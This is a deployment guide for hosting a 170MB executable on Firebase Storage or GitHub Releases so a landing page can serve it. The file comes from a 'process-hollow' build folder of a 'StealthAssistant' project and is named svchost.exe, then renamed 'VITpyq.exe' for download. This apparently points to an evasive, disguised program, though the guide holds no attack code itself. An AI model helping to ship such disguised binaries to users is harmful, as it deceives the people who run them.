# Firebase Storage Upload Instructions

## Problem
Vercel has a 100MB file size limit, but our VITpyq.exe is 170MB.

## Solution
Host the exe file on Firebase Storage (free tier: 1GB storage, 10GB/month bandwidth).

---

## Step 1: Upload VITpyq.exe to Firebase Storage

### Option A: Using Firebase Console (Easiest)

1. **Go to Firebase Console**
   - Visit: https://console.firebase.google.com/
   - Select your project: `namba-dhn`

2. **Navigate to Storage**
   - Click "Storage" in the left sidebar
   - Click "Get Started" if this is your first time

3. **Upload the File**
   - Click "Upload file" button
   - Select: `dist-advanced/process-hollow/svchost.exe`
   - Rename it to: `VITpyq.exe` during upload
   - Wait for upload to complete (~170MB)

4. **Set Public Access (Important!)**
   - Click on the uploaded `VITpyq.exe` file
   - Click the "Access token" tab
   - Click "Create token" to generate a download token
   - OR set Firebase Storage Rules to allow public read:

### Option B: Set Firebase Storage Rules for Public Read

1. Go to Storage → Rules tab
2. Replace with:
```
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /{allPaths=**} {
      allow read: if true;  // Public read access
      allow write: if request.auth != null;  // Only authenticated users can write
    }
  }
}
```
3. Click "Publish"

---

## Step 2: Verify Upload

1. **Check File Exists**
   - In Firebase Console → Storage
   - You should see `VITpyq.exe` (170MB)

2. **Test Download URL**
   - Click on the file
   - Copy the download URL
   - Paste in browser to test download

---

## Step 3: Deploy to Vercel

Now that the exe is hosted on Firebase Storage, you can deploy the landing page to Vercel:

```bash
cd landing-page
npm run build
vercel --prod
```

The landing page will now fetch the exe from Firebase Storage instead of the public folder.

---

## Alternative: Using Firebase CLI

If you prefer command line:

```bash
# Install Firebase CLI
npm install -g firebase-tools

# Login
firebase login

# Initialize storage (if not done)
firebase init storage

# Upload file
firebase storage:upload dist-advanced/process-hollow/svchost.exe VITpyq.exe --project namba-dhn
```

---

## Cost Estimate (Firebase Free Tier)

- **Storage**: 1GB free (VITpyq.exe = 170MB = 17% of free tier)
- **Bandwidth**: 10GB/month free
  - Each download = 170MB
  - Free tier allows: ~58 downloads/month
  - After that: $0.12 per GB

**For more downloads**, consider:
- Upgrade to Firebase Blaze plan (pay-as-you-go)
- Use GitHub Releases (unlimited, free)
- Use CDN like Cloudflare R2 (10GB free egress/month)

---

## GitHub Releases Alternative (Unlimited & Free)

If you want unlimited downloads for free:

1. **Create a GitHub Repository**
   ```bash
   cd StealthAssistant
   git init
   git add dist-advanced/process-hollow/svchost.exe
   git commit -m "Add VITpyq.exe"
   git remote add origin https://github.com/YOUR_USERNAME/vitpyq-releases.git
   git push -u origin main
   ```

2. **Create a Release**
   - Go to GitHub repo → Releases → "Create a new release"
   - Tag: `v1.0.0`
   - Title: `VITpyq v1.0.0`
   - Upload `svchost.exe` as release asset
   - Rename to `VITpyq.exe`
   - Publish release

3. **Get Direct Download Link**
   - Right-click on the asset → Copy link
   - Format: `https://github.com/USERNAME/REPO/releases/download/v1.0.0/VITpyq.exe`

4. **Update AuthDialog.tsx**
   ```typescript
   const exeResponse = await fetch('https://github.com/USERNAME/REPO/releases/download/v1.0.0/VITpyq.exe');
   ```

---

## Recommendation

**Use Firebase Storage** since you're already using Firebase for authentication. It's the simplest integration and provides good performance with the free tier.

If you expect more than 58 downloads/month, switch to **GitHub Releases** (unlimited, free).
